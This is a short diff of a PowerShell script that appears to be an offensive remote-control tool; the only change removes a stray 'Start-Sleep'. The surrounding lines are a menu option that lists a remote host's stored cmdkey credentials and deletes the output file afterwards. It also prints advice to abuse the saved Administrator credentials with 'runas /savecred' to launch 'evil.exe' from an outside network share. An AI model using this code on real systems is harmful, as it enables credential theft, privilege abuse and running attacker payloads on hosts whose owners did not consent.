@@ -490,7 +490,7 @@ While($Client.Connected)
       If($choise -eq "ListCred" -or $choise -eq "cred")
       {
         write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
-        write-host " Attacker can then use runas with the /savecred options in order to use the saved credentials." -ForegroundColor Green;Start-Sleep 
+        write-host " Attacker can then use runas with the /savecred options in order to use the saved credentials." -ForegroundColor Green;
         write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n`n";
         $Command = "cmdkey /list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
       }
